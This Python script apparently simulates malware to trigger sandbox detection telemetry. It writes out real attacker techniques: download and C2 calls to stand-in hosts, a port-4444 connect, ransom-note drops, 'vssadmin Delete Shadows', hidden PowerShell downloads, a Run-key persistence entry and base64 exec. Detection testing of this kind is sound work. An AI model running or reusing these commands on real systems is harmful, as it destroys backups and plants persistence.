import os
import subprocess
import socket
import urllib.request
import ctypes
import tempfile
import sys

# 1. Network Activity (C2 Connection & Payload Download)
try:
    # Triggers DNS Query & HTTP Request telemetry
    req = urllib.request.Request("http://evil-c2-server.malware.com/payload.exe")
    urllib.request.urlopen(req, timeout=1)
except Exception:
    pass

try:
    # Triggers raw socket connection telemetry
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1) # Fail fast so we don't hang the sandbox
    s.connect(("185.15.20.1", 4444))  # Typical reverse shell port
except Exception:
    pass

# 2. File Drops (Ransomware note & payload)
try:
    # Triggers FILE_WRITE and FILE_DROP telemetry
    drop_path = os.path.join(tempfile.gettempdir(), "svchost_payload.exe")
    with open(drop_path, 'w') as f:
        f.write("MZ... this is a fake executable payload containing shellcode")
    
    ransom_note = os.path.join(tempfile.gettempdir(), "RESTORE_FILES.txt")
    with open(ransom_note, 'w') as f:
        f.write("All your files are encrypted! Pay 1 BTC to this address...")
except Exception:
    pass

# 3. Process Execution & Defense Evasion
try:
    # Triggers PROCESS_CREATE (vssadmin delete shadows is a classic ransomware indicator)
    os.system("vssadmin.exe Delete Shadows /All /Quiet")
    
    # Triggers PROCESS_CREATE with PowerShell (T1059.001)
    subprocess.Popen([
        "powershell.exe", 
        "-ExecutionPolicy", "Bypass", 
        "-WindowStyle", "Hidden", 
        "-Command", "Invoke-WebRequest -Uri http://evil.com/mal.exe -OutFile $env:TEMP\\mal.exe"
    ])
except Exception:
    pass

# 4. Registry Persistence (Windows)
try:
    # Triggers REGISTRY_CREATE and PERSISTENCE_EVENT (CurrentVersion\Run)
    import winreg
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(key, "Windows Defender Updater", 0, winreg.REG_SZ, drop_path)
    winreg.CloseKey(key)
except Exception:
    pass

# 5. Memory Injection Simulation (Process Hollowing / Shellcode injection)
try:
    # We just need to trigger the ctypes lookup for the sandbox to catch the API resolution
    # Triggers MEMORY_INJECTION telemetry
    if os.name == 'nt':
        ctypes.windll.kernel32.VirtualAllocEx
        ctypes.windll.kernel32.WriteProcessMemory
        ctypes.windll.kernel32.CreateRemoteThread
except Exception:
    pass

# 6. Dynamic Code Execution
try:
    # Triggers EXECUTION telemetry
    malicious_code = "import base64; exec(base64.b64decode('cHJpbnQoJ0V4ZWN1dGluZyBvYmZ1c2NhdGVkIHBheWxvYWQuLi4nKQ==').decode())"
    exec(malicious_code)
except Exception:
    pass

print("Malicious operations completed.")
